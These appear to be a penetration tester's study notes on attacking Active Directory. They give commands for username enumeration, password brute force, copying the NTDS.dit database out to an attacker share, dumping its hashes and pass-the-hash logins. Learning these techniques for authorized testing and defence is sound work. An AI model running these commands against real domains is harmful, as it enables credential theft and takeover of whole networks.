- ==`Active Directory(AD)`== is a common and crucial directory server in modern enterprise network.
- `AD` is something that pentester will repeatedly encounter.
- There are various of method that can be used to attack and defend the `AD`.

#### Understanding the Active Directory:

- Once Windows System is joined to a domain, it will no longer default to referencing the SAM database to validate logon requests.
- That Domain-joined system will now send authentication requests to be validate by the domain controller before allowing a user to log on.
	- This does not means that SAM database can no longer be used.
	- The user still can logon to the system by specifying the hostname of the device proceeded by the Username==`(devive_name\user_name)`== or with direct access to the device then typing ==`.\`== at the logon UI in the `username` field.
## Dictionary attacks against AD accounts using NetExec:

- Dictionary attack is essentially using the power of a computer to guess a username  and/or password using a customized list of potential username and passwords.
- It can be rather ==`noisy`== to conduct these attacks over a network because they can generate a lot of network traffic and alerts on the target system as well as eventually get denied due to login attempts that can be applied through the use of [Group Policy](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831791\(v=ws.11\))
	
	- ##### Creating a custom list of username:
		
		-  Custom list can be made by using names based on publicly available information.
		- Keep the list relatively short because organization can have a huge number of employees.
		- Can use a manually created list or use an ==`automated list generator`== such as:
			
			- ==`Username Anarchy`== which is Ruby-based tool. 
				- This can tool can be used to convert a list of real names into common formats.
				
				- ###### Installation:
					- `git clone https://github.com/urbanadventurer/username-anarchy.git`
				
				- ###### Command:
					- `./username-anarchy -i </path/to/username_file>`
	
	- ##### Enumerating valid username with Kerbrute:
		
		- Before guessing password for usernames which might not even exist, it may be worthful identifying the correct naming convention and confirming the validity of some usernames.
		- Tool like ==`Kerbrute`== can be used to brute-force, password spraying and username enumeration.
			- `Command to enumerate username`:
			
				- `./kerbrute_linux_amd64 userenum --dc <target> --domain <doamin_name> <path/to/user_name.txt>`
			
	- ##### Launching a brute-force attack with NetExec:
		
		- Once the list is prepared  or discover, then we can launch a brute-force attack against the target domain controller using a tool such as NetExec.
			- Command:
				- `netexec <protocol> <target_ip> -u <user_name> -p </path/to/passeord_list>`
				- If the admins configured an account lockout policy, this attack could lockout the account.
	
## Capturing NTDS.dit

- ==`NT Directory Services(NTDS)`== is the directory service used with AD to find & `organize network resources`.
- NTDS.dit file is stored at `%systemroot%/ntds` on the domain controllers in a forest. The `.dit` stands for `directory information tree` 
- This is the primary database file associated with AD and stores all domain usernames, password hashes and other critical schema information.
	- If this can be captured then it could potentially compromise every account.
	
	- ##### Connecting to a Domain Controller(DC) with Evil-WinRM: 
	
		- The attacker can connect to target DC using the credential:
			
			- ##### Command:
				- `evil-winrm -i <target> -u <user_name> -p <'pass_word'>`
				- Once connects to the user the privileges can be seen, then start looking at the local group.
				- ###### Command:
					- `net localgroup`
	
	- ##### Checking user account privileges including domain:
		
		- ###### Command:
			- `net user <user_name>`
		
	- ##### Creating shadow copy of C:
		
		-  Use ==`vssadmin`== tool to create a `volume shadow copy(VSS)` of the C: drive.
		- It is very likely that NTDS will be stored on C: as that is the default location selected at install
		
		- ###### Command:
			- `vssadmin CREATE SHADOW /For=C:`
		
	- ##### Copying NTDS.dit from the VSS:
		
		-  Copy the NTDS.dit file from the volume shadow copy of C: onto another location on the drive to prepare to move NTDS.dit to the host.
		- ```PS C:\NTDS> cmd.exe /c copy \\?<orginal_location_of_NTDS.dit> C:\to\path\NTDS.dit```
	
	- ##### Transferring NTDS.dit to attack host:
		
		-  `PS C:\NTDS> cmd.exe /c move C:\to\path\NTDS.dit \\<host_ip>\share_name` 
	
	- ##### Extracting hashes from NTDS.dit:
		
		- Use impacket-secretsdump tool to dump hashes of NTDS file.
			
			- ###### Command:
				- `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`
	
	- ##### A faster method: Using NetExec to capture NTDS.dit:
		
		- Use `netexec` tool to get the results faster, It allow to utilize VSS to quickly capture  and ump the contents of the NTDS.dit file congenitally within the terminal.
			
			- ##### Command:
				- `netexec smb <target> -u <user_name> -p <pass_word> -M ntdsutil`

- ## Pass the Hash(PtH) consideration:
	
	- Use hashes to attempt to authenticate with a system using a attack called ==`Pass-the-Hash`== 
	- A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash.
		- `username:password_hash`
	- ###### Command:
		- `evil-winrm -i <target> -u <user_name> -H <hash_value>`


[[Introduction to Password Attacks]]
